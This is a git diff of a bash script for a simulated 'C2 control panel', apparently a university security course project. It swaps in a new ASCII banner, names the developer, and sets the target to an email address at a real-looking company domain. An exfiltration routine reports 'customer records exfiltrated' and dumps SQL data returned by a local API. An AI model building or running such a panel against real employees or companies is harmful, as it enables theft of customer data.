@@ -1,13 +1,15 @@
 #!/bin/bash
 
-# ANSI Color Codes
+
 GREEN='\033[0;32m'
 RED='\033[0;31m'
 CYAN='\033[0;36m'
 YELLOW='\033[1;33m'
-NC='\033[0m' # No Color
+ORANGE='\033[38;2;255;165;0m'
 
-# Resolve Windows Host IP if running inside WSL
+NC='\033[0m' 
+
+
 WINDOWS_HOST="localhost"
 if ! curl -s -m 1 -o /dev/null -w "%{http_code}" "http://localhost:5000/api/status" | grep -q "200"; then
     if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
@@ -22,10 +24,20 @@ fi
 API_URL="http://${WINDOWS_HOST}:5000/api"
 
 clear
-echo -e "${CYAN}====================================================${NC}"
-echo -e "${CYAN}          KALI LINUX - C2 CONTROL PANEL             ${NC}"
-echo -e "${CYAN}====================================================${NC}"
-echo -e "Target Endpoint: ${YELLOW}employee@company.local${NC}"
+
+echo -e "${ORANGE}"
+cat << "EOF"
+██╗   ██╗██╗██╗   ██╗     ██████╗███████╗███████╗    ██╗  ██╗███████╗██████╗  ██╗
+██║   ██║██║██║   ██║    ██╔════╝██╔════╝██╔════╝    ██║  ██║██╔════╝╚════██╗███║
+██║   ██║██║██║   ██║    ██║     ███████╗█████╗      ███████║███████╗ █████╔╝╚██║
+██║   ██║██║██║   ██║    ██║     ╚════██║██╔══╝      ╚════██║╚════██║ ╚═══██╗ ██║
+╚██████╔╝██║╚██████╔╝    ╚██████╗███████║███████╗         ██║███████║██████╔╝ ██║
+ ╚═════╝ ╚═╝ ╚═════╝      ╚═════╝╚══════╝╚══════╝         ╚═╝╚══════╝╚═════╝  ╚═╝
+EOF
+echo -e "${NC}"
+
+echo -e "Developer:       ${YELLOW}Ashraful Islam Tanzil (UIU)${NC}"
+echo -e "Target Endpoint: ${YELLOW}rakib3241@shwapno.bd${NC}"
 echo -e "Resolved Host:   ${YELLOW}${WINDOWS_HOST}${NC}"
 echo -e "Host API:        ${YELLOW}${API_URL}${NC}"
 echo -e "${CYAN}----------------------------------------------------${NC}"
@@ -60,7 +72,7 @@ attempt_exfiltrate() {
     elif [[ $response == *"success\":true"* ]]; then
         echo -e "${GREEN}[+] EXFILTRATION SUCCESSFUL! Customer records exfiltrated:${NC}"
         echo -e "${CYAN}----------------------------------------------------${NC}"
-        # Extract SQL content from JSON (handles newline character literals)
+        
         echo "$response" | grep -o '"data":"[^"]*' | cut -d'"' -f4 | sed 's/\\n/\n/g'
         echo -e "${CYAN}----------------------------------------------------${NC}"
     else
